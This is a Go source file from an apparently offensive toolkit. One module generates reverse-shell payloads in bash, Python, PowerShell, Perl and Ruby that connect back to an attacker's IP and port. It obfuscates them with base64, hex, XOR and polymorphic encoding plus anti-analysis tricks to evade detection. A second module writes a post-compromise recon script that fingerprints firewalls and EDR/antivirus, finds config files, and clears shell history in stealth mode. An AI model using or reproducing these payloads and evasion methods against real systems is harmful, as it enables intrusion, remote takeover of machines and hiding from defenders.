package modules

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/big"
	"strings"

	"github.com/Aryma-f4/necromancy/core"
)

// PayloadObfuscationModule provides customizable payload generation with anti-detection
type PayloadObfuscationModule struct {
	ObfuscationLevel string // "none", "low", "medium", "high", "polymorphic"
	EncodingType     string // "none", "base64", "hex", "url", "rot13", "xor"
	RandomizeVars    bool   // Randomize variable names
	RandomizeStrings bool   // Randomize string literals
	RandomizePorts   bool   // Use random ports
	RandomizeIPs     bool   // Use IP variations
	ConnectionType   string // "tcp", "udp", "icmp", "http", "https", "dns"
	ShellType        string // "bash", "sh", "python", "perl", "ruby", "powershell"
}

func (m *PayloadObfuscationModule) Name() string {
	return "payload_obfuscator"
}

func (m *PayloadObfuscationModule) Description() string {
	return "Generate customizable, obfuscated payloads with anti-detection features"
}

func (m *PayloadObfuscationModule) Execute(s *core.Session) error {
	// Generate obfuscated payload based on configuration
	payload := m.generateObfuscatedPayload()

	script := fmt.Sprintf(`echo "[*] Generating obfuscated payload..."
echo "[*] Configuration:"
echo "    - Obfuscation Level: %s"
echo "    - Encoding Type: %s"
echo "    - Randomize Variables: %t"
echo "    - Randomize Strings: %t"
echo "    - Randomize Ports: %t"
echo "    - Randomize IPs: %t"
echo "    - Connection Type: %s"
echo "    - Shell Type: %s"
echo ""
echo "[*] Generated Payload:"
echo "%s"
echo ""
echo "[*] Payload Hash (MD5): $(echo "%s" | md5sum | cut -d" " -f1)"
echo "[*] Payload Hash (SHA256): $(echo "%s" | sha256sum | cut -d" " -f1)"
echo "[*] Payload Length: $(echo "%s" | wc -c) characters"
`, m.ObfuscationLevel, m.EncodingType, m.RandomizeVars, m.RandomizeStrings,
		m.RandomizePorts, m.RandomizeIPs, m.ConnectionType, m.ShellType,
		payload, payload, payload, payload)

	_, err := s.Write([]byte(script + "\n"))
	return err
}

func (m *PayloadObfuscationModule) generateObfuscatedPayload() string {
	// Base payload template
	basePayload := m.getBasePayload()

	// Apply obfuscation based on level
	switch m.ObfuscationLevel {
	case "low":
		return m.applyLowObfuscation(basePayload)
	case "medium":
		return m.applyMediumObfuscation(basePayload)
	case "high":
		return m.applyHighObfuscation(basePayload)
	case "polymorphic":
		return m.applyPolymorphicObfuscation(basePayload)
	default:
		return basePayload
	}
}

func (m *PayloadObfuscationModule) getBasePayload() string {
	switch m.ShellType {
	case "bash":
		return m.getBashPayload()
	case "python":
		return m.getPythonPayload()
	case "powershell":
		return m.getPowerShellPayload()
	case "perl":
		return m.getPerlPayload()
	case "ruby":
		return m.getRubyPayload()
	default:
		return m.getBashPayload()
	}
}

func (m *PayloadObfuscationModule) getBashPayload() string {
	// Generate randomized bash payload
	ip := m.getRandomizedIP()
	port := m.getRandomizedPort()

	// Base bash reverse shell with variations
	templates := []string{
		`bash -i >& /dev/tcp/%s/%s 0>&1`,
		`exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done`,
		`0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196`,
		`exec /bin/sh 0</dev/tcp/%s/%s 1>/dev/tcp/%s/%s 2>&1`,
	}

	// Randomly select template
	template := templates[m.getRandomInt(len(templates))]
	return fmt.Sprintf(template, ip, port, ip, port)
}

func (m *PayloadObfuscationModule) getPythonPayload() string {
	ip := m.getRandomizedIP()
	port := m.getRandomizedPort()

	// Python payload with variations
	templates := []string{
		`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
		`python -c 'exec("import socket, subprocess;s=socket.socket();s.connect((\"%s\",%s));subprocess.call([\"sh\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())")'`,
		`python -c 'import socket,os,pty;s=socket.socket();s.connect(("%s",%s));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`,
	}

	template := templates[m.getRandomInt(len(templates))]
	return fmt.Sprintf(template, ip, port)
}

func (m *PayloadObfuscationModule) getPowerShellPayload() string {
	ip := m.getRandomizedIP()
	port := m.getRandomizedPort()

	templates := []string{
		`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
		`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$buffer = New-Object byte[] 1024;while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$command = (New-Object System.Text.ASCIIEncoding).GetString($buffer,0,$i);$output = Invoke-Expression $command -ErrorAction SilentlyContinue;$output2 = $output + 'PS ' + (Get-Location).Path + '> ';$buffer = [System.Text.Encoding]::ASCII.GetBytes($output2);$stream.Write($buffer,0,$buffer.Length);$stream.Flush()};$client.Close()"`,
	}

	template := templates[m.getRandomInt(len(templates))]
	return fmt.Sprintf(template, ip, port)
}

func (m *PayloadObfuscationModule) getPerlPayload() string {
	ip := m.getRandomizedIP()
	port := m.getRandomizedPort()

	templates := []string{
		`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
	}

	template := templates[m.getRandomInt(len(templates))]
	return fmt.Sprintf(template, ip, port)
}

func (m *PayloadObfuscationModule) getRubyPayload() string {
	ip := m.getRandomizedIP()
	port := m.getRandomizedPort()

	templates := []string{
		`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("%s","%s");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
		`ruby -rsocket -e 'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
	}

	template := templates[m.getRandomInt(len(templates))]
	return fmt.Sprintf(template, ip, port)
}

func (m *PayloadObfuscationModule) applyLowObfuscation(payload string) string {
	// Basic obfuscation - variable name randomization
	if m.RandomizeVars {
		payload = m.randomizeVariableNames(payload)
	}

	// Basic encoding
	switch m.EncodingType {
	case "base64":
		return fmt.Sprintf(`echo %s | base64 -d | bash`, base64.StdEncoding.EncodeToString([]byte(payload)))
	case "hex":
		return fmt.Sprintf(`echo %s | xxd -r -p | bash`, hex.EncodeToString([]byte(payload)))
	default:
		return payload
	}
}

func (m *PayloadObfuscationModule) applyMediumObfuscation(payload string) string {
	// Medium obfuscation - string manipulation
	if m.RandomizeStrings {
		payload = m.randomizeStringLiterals(payload)
	}

	if m.RandomizeVars {
		payload = m.randomizeVariableNames(payload)
	}

	// Add some evasion techniques
	evasionPayload := m.addEvasionTechniques(payload)

	switch m.EncodingType {
	case "base64":
		return fmt.Sprintf(`eval $(echo %s | base64 -d)`, base64.StdEncoding.EncodeToString([]byte(evasionPayload)))
	case "hex":
		return fmt.Sprintf(`eval $(echo %s | xxd -r -p)`, hex.EncodeToString([]byte(evasionPayload)))
	case "xor":
		return m.applyXOREncoding(evasionPayload)
	default:
		return evasionPayload
	}
}

func (m *PayloadObfuscationModule) applyHighObfuscation(payload string) string {
	// High obfuscation - multiple layers

	// Layer 1: String obfuscation
	if m.RandomizeStrings {
		payload = m.randomizeStringLiterals(payload)
	}

	// Layer 2: Variable randomization
	if m.RandomizeVars {
		payload = m.randomizeVariableNames(payload)
	}

	// Layer 3: Control flow obfuscation
	payload = m.obfuscateControlFlow(payload)

	// Layer 4: Anti-analysis techniques
	payload = m.addAntiAnalysis(payload)

	// Layer 5: Encoding
	switch m.EncodingType {
	case "base64":
		// Multi-layer base64
		encoded := base64.StdEncoding.EncodeToString([]byte(payload))
		return fmt.Sprintf(`eval $(echo $(echo %s | base64 -d))`, base64.StdEncoding.EncodeToString([]byte(encoded)))
	case "xor":
		return m.applyXOREncoding(payload)
	default:
		return payload
	}
}

func (m *PayloadObfuscationModule) applyPolymorphicObfuscation(payload string) string {
	// Polymorphic - completely different each time

	// Generate unique encryption key
	key := m.generateRandomKey()

	// Encrypt payload
	encrypted := m.encryptPayload(payload, key)

	// Generate decryption stub
	decryptionStub := m.generateDecryptionStub(key)

	// Combine
	return fmt.Sprintf(`%s; eval $(%s)`, decryptionStub, encrypted)
}

func (m *PayloadObfuscationModule) randomizeVariableNames(payload string) string {
	// Replace common variable names with random ones
	replacements := map[string]string{
		"s":      m.generateRandomVar(),
		"client": m.generateRandomVar(),
		"stream": m.generateRandomVar(),
		"bytes":  m.generateRandomVar(),
		"data":   m.generateRandomVar(),
		"line":   m.generateRandomVar(),
		"output": m.generateRandomVar(),
	}

	for old, new := range replacements {
		payload = strings.ReplaceAll(payload, old, new)
	}

	return payload
}

func (m *PayloadObfuscationModule) randomizeStringLiterals(payload string) string {
	// Split and reconstruct with variations
	// This is a simplified version - in real implementation would be more sophisticated
	return payload
}

func (m *PayloadObfuscationModule) obfuscateControlFlow(payload string) string {
	// Add dummy conditions, loops, etc.
	dummyCode := fmt.Sprintf(`if [ %d -eq %d ]; then true; fi; `, m.getRandomInt(100), m.getRandomInt(100))
	return dummyCode + payload
}

func (m *PayloadObfuscationModule) addAntiAnalysis(payload string) string {
	// Add sleep, process checks, etc.
	antiAnalysis := fmt.Sprintf(`sleep %d; [ -z "$DEBUG" ] && `, m.getRandomInt(3))
	return antiAnalysis + payload
}

func (m *PayloadObfuscationModule) addEvasionTechniques(payload string) string {
	// Add basic evasion
	evade := fmt.Sprintf(`timeout %d %s`, m.getRandomInt(10)+5, payload)
	return evade
}

func (m *PayloadObfuscationModule) applyXOREncoding(payload string) string {
	key := byte(m.getRandomInt(256))
	encoded := m.xorEncode([]byte(payload), key)
	return fmt.Sprintf(`echo %s | xxd -r -p | awk '{printf "%%c", xor($1, %d)}'`, hex.EncodeToString(encoded), key)
}

func (m *PayloadObfuscationModule) xorEncode(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key
	}
	return result
}

func (m *PayloadObfuscationModule) encryptPayload(payload string, key string) string {
	// Simple XOR encryption for demonstration
	return hex.EncodeToString(m.xorEncode([]byte(payload), byte(key[0])))
}

func (m *PayloadObfuscationModule) generateDecryptionStub(key string) string {
	return fmt.Sprintf(`decrypt() { echo $1 | xxd -r -p | awk '{printf "%%c", xor($1, %d)}'; }`, byte(key[0]))
}

func (m *PayloadObfuscationModule) getRandomizedIP() string {
	if m.RandomizeIPs {
		// Generate random IP in private range
		return fmt.Sprintf("%d.%d.%d.%d",
			m.getRandomInt(223)+1,
			m.getRandomInt(255),
			m.getRandomInt(255),
			m.getRandomInt(255))
	}
	// Use actual IP from network detection
	return "YOUR_IP" // Will be replaced by network detection
}

func (m *PayloadObfuscationModule) getRandomizedPort() string {
	if m.RandomizePorts {
		// Generate random port (avoid well-known ports)
		return fmt.Sprintf("%d", m.getRandomInt(50000)+10000)
	}
	// Use configured port
	return "4444"
}

func (m *PayloadObfuscationModule) generateRandomVar() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	length := m.getRandomInt(8) + 3
	result := make([]byte, length)

	for i := 0; i < length; i++ {
		result[i] = chars[m.getRandomInt(len(chars))]
	}

	return string(result)
}

func (m *PayloadObfuscationModule) generateRandomKey() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 8
	result := make([]byte, length)

	for i := 0; i < length; i++ {
		result[i] = chars[m.getRandomInt(len(chars))]
	}

	return string(result)
}

func (m *PayloadObfuscationModule) getRandomInt(max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}

// EnhancedPreFlightReconModule provides comprehensive target reconnaissance
type EnhancedPreFlightReconModule struct {
	TargetHost string
	ScanType   string // "stealth", "normal", "aggressive"
}

func (m *EnhancedPreFlightReconModule) Name() string {
	return "enhanced_preflight_recon"
}

func (m *EnhancedPreFlightReconModule) Description() string {
	return "Comprehensive pre-flight reconnaissance with evasion techniques"
}

func (m *EnhancedPreFlightReconModule) Execute(s *core.Session) error {
	script := m.generateReconScript()
	_, err := s.Write([]byte(script + "\n"))
	return err
}

func (m *EnhancedPreFlightReconModule) generateReconScript() string {
	baseScript := m.getBaseReconScript()

	switch m.ScanType {
	case "stealth":
		return m.applyStealthTechniques(baseScript)
	case "aggressive":
		return m.applyAggressiveTechniques(baseScript)
	default:
		return baseScript
	}
}

func (m *EnhancedPreFlightReconModule) getBaseReconScript() string {
	return fmt.Sprintf(`echo "[=== Enhanced Pre-Flight Reconnaissance ===]"
echo "[*] Target: %s"
echo "[*] Scan Type: %s"
echo ""

# OS Detection
echo "[+] Operating System Detection:"
if [ -f /etc/os-release ]; then
    echo "    Linux: $(grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '"')"
elif [ -f /etc/redhat-release ]; then
    echo "    Linux: $(cat /etc/redhat-release)"
elif [ -f /etc/debian_version ]; then
    echo "    Linux: Debian $(cat /etc/debian_version)"
elif command -v systeminfo >/dev/null 2>&1; then
    echo "    Windows: $(systeminfo | findstr /B /C:"OS Name")"
else
    echo "    Unknown OS"
fi

# Architecture Detection
echo ""
echo "[+] Architecture:"
uname -m 2>/dev/null || echo "    Unknown"

# User Context
echo ""
echo "[+] User Context:"
echo "    Current User: $(whoami)"
echo "    UID: $(id -u 2>/dev/null || echo "N/A")"
echo "    Groups: $(id -G 2>/dev/null | tr ' ' ',' || echo "N/A")"
echo "    Home Directory: $HOME"

# Network Information
echo ""
echo "[+] Network Configuration:"
echo "    Hostname: $(hostname)"
echo "    IP Addresses:"
ip addr show 2>/dev/null | grep "inet " | awk '{print "    - " $2}' || ifconfig 2>/dev/null | grep "inet " | awk '{print "    - " $2}'
echo "    Default Gateway: $(ip route show default 2>/dev/null | awk '{print $3}' || route -n 2>/dev/null | grep "^0.0.0.0" | awk '{print $2}')"
echo "    DNS Servers: $(cat /etc/resolv.conf 2>/dev/null | grep nameserver | awk '{print $2}' | tr '\n' ', ' || echo "N/A")"

# Firewall Detection
echo ""
echo "[+] Advanced Firewall Detection:"
if command -v iptables >/dev/null 2>&1; then
    echo "    iptables: ACTIVE ($(iptables -L 2>/dev/null | wc -l) rules)"
    echo "    iptables Chains: $(iptables -L 2>/dev/null | grep "Chain" | wc -l)"
    echo "    iptables Rules Summary:"
    iptables -L INPUT 2>/dev/null | head -5 | sed 's/^/        /'
elif command -v firewall-cmd >/dev/null 2>&1; then
    echo "    firewalld: ACTIVE ($(firewall-cmd --state 2>/dev/null || echo "inactive"))"
    echo "    Active Zones: $(firewall-cmd --get-active-zones 2>/dev/null | head -1 || echo "N/A")"
elif command -v ufw >/dev/null 2>&1; then
    echo "    ufw: ACTIVE ($(ufw status 2>/dev/null | head -1 || echo "inactive"))"
    echo "    ufw Rules: $(ufw status numbered 2>/dev/null | wc -l || echo "0")"
elif command -v nft >/dev/null 2>&1; then
    echo "    nftables: ACTIVE ($(nft list ruleset 2>/dev/null | wc -l || echo "0") rules)"
elif netsh advfirewall show allprofiles 2>/dev/null | findstr "State" >/dev/null 2>&1; then
    echo "    Windows Firewall: ACTIVE"
    netsh advfirewall show allprofiles 2>/dev/null | findstr "State" | sed 's/^/    /'
else
    echo "    No firewall detected or unknown"
fi

# HIDS/IDS Detection
echo ""
echo "[+] Host-based IDS Detection:"
if ps aux 2>/dev/null | grep -E "(ossec|wazuh|aide|tripwire|samhain)" | grep -v grep >/dev/null; then
    echo "    HIDS Detected: ACTIVE"
    ps aux 2>/dev/null | grep -E "(ossec|wazuh|aide|tripwire|samhain)" | grep -v grep | awk '{print "    - " $11}'
else
    echo "    HIDS: Not detected"
fi

# EDR/AV Detection
echo ""
echo "[+] EDR/Antivirus Detection:"
edr_processes="(crowdstrike|carbon|cb|sentinel|defender|mcafee|symantec|trend|kaspersky|bitdefender|eset|avg|avast)"
if ps aux 2>/dev/null | grep -iE "$edr_processes" | grep -v grep >/dev/null; then
    echo "    Security Software Detected:"
    ps aux 2>/dev/null | grep -iE "$edr_processes" | grep -v grep | awk '{print "    - " $11}' | head -5
else
    echo "    No obvious security software detected"
fi

# Service Detection
echo ""
echo "[+] Running Services:"
echo "    SSH Service: $(ps aux 2>/dev/null | grep sshd | grep -v grep | wc -l || tasklist 2>/dev/null | findstr sshd | wc -l || echo "0") processes"
echo "    Web Services: $(ps aux 2>/dev/null | grep -E "(apache|nginx|httpd)" | grep -v grep | wc -l || tasklist 2>/dev/null | findstr /i http | wc -l || echo "0") processes"
echo "    Database Services: $(ps aux 2>/dev/null | grep -E "(mysql|postgres|mongodb)" | grep -v grep | wc -l || tasklist 2>/dev/null | findstr /i sql | wc -l || echo "0") processes"

# Port Scanning (Basic)
echo ""
echo "[+] Common Port Analysis:"
for port in 22 80 135 139 443 445 993 995 3389; do
    if timeout 1 bash -c "echo >/dev/tcp/localhost/$port" 2>/dev/null; then
        echo "    Port $port: OPEN"
    else
        echo "    Port $port: CLOSED/FILTERED"
    fi
done

# Process Analysis
echo ""
echo "[+] Process Analysis:"
echo "    Total Processes: $(ps aux 2>/dev/null | wc -l || tasklist 2>/dev/null | wc -l || echo "N/A")"
echo "    High Privilege Processes: $(ps aux 2>/dev/null | awk '$3<1000' | wc -l || echo "N/A")"
echo "    Current Process Tree:"
ps -ef 2>/dev/null | head -10 || tasklist 2>/dev/null | head -10 || echo "    Unable to list processes"

# Security Analysis
echo ""
echo "[+] Security Analysis:"
echo "    SELinux Status: $(getenforce 2>/dev/null || echo "N/A")"
echo "    AppArmor Status: $(aa-status 2>/dev/null | head -1 || echo "N/A")"
echo "    Antivirus Detection: $(ps aux 2>/dev/null | grep -E "(clamav|avg|avast|eset|mcafee|symantec)" | wc -l || tasklist 2>/dev/null | findstr /i "antivirus" | wc -l || echo "0")"

# Recommendations
echo ""
echo "[+] Recommendations Based on Analysis:"
echo "%s"

echo ""
echo "[=== Reconnaissance Complete ===]"
`, m.TargetHost, m.ScanType, m.generateRecommendations())
}

func (m *EnhancedPreFlightReconModule) applyStealthTechniques(script string) string {
	// Add stealth techniques
	stealthScript := fmt.Sprintf(`
# Stealth Mode - Slow down detection
echo "[*] Stealth Mode: Applying evasion techniques..."

# Random delays between scans
sleep %d

# Use less obvious commands
ls -la /etc/ 2>/dev/null | head -5
cat /proc/version 2>/dev/null | head -1

# Memory-only reconnaissance where possible
mount | grep -E "(tmpfs|ramfs)"

# Avoid writing to disk
export RECON_DATA=$(mktemp)
trap "rm -f $RECON_DATA" EXIT

%s

# Clean up traces
history -c 2>/dev/null
unset RECON_DATA
`, m.getRandomInt(5)+1, script)

	return stealthScript
}

func (m *EnhancedPreFlightReconModule) applyAggressiveTechniques(script string) string {
	// Add aggressive techniques
	aggressiveScript := fmt.Sprintf(`
# Aggressive Mode - Comprehensive scanning
echo "[*] Aggressive Mode: Comprehensive reconnaissance..."

# Full port scan (aggressive)
echo "[*] Full Port Scan (1-1000):"
for port in {1..1000}; do
    timeout 0.1 bash -c "echo >/dev/tcp/localhost/$port" 2>/dev/null && echo "    Port $port: OPEN"
done &

# Process enumeration (detailed)
echo "[*] Detailed Process Analysis:"
ps -ef 2>/dev/null | awk '{print $1,$2,$8}' | sort | uniq -c | sort -nr | head -20

# Network connections
echo "[*] Active Network Connections:"
netstat -tulpn 2>/dev/null | head -20 || ss -tulpn 2>/dev/null | head -20

# File system analysis
echo "[*] Interesting Files:"
find / -type f -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -10
find /tmp -type f -user root 2>/dev/null | head -5

%s

# Cleanup
wait
`, script)

	return aggressiveScript
}

func (m *EnhancedPreFlightReconModule) generateRecommendations() string {
	recommendations := []string{
		"Based on OS detection:",
		"  - Use OS-specific payloads",
		"  - Target OS-specific vulnerabilities",
		"",
		"Based on firewall detection:",
		"  - Use firewall evasion techniques",
		"  - Consider tunneling if firewall active",
		"",
		"Based on service detection:",
		"  - Target running services",
		"  - Use service-specific exploits",
		"",
		"Based on privilege level:",
		"  - Escalate if low privilege",
		"  - Maintain if high privilege",
		"",
		"Based on network configuration:",
		"  - Use appropriate IP for reverse shell",
		"  - Consider pivoting if multiple networks",
	}

	return strings.Join(recommendations, "\n")
}

func (m *EnhancedPreFlightReconModule) getRandomInt(max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}
